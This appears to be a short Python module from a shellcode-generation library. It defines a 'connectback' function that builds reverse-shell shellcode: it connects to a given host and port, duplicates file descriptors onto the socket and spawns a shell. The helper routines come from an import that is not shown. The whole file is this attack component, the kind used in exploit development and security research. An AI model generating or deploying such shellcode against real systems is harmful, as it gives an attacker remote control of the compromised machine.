from . import *

def connectback(host, port):
    """Args: host, port
    Standard connect back type shellcode."""
    return \
        connect(host, port) + \
        'xchg esi, ebx' + \
        dup() + \
        sh()
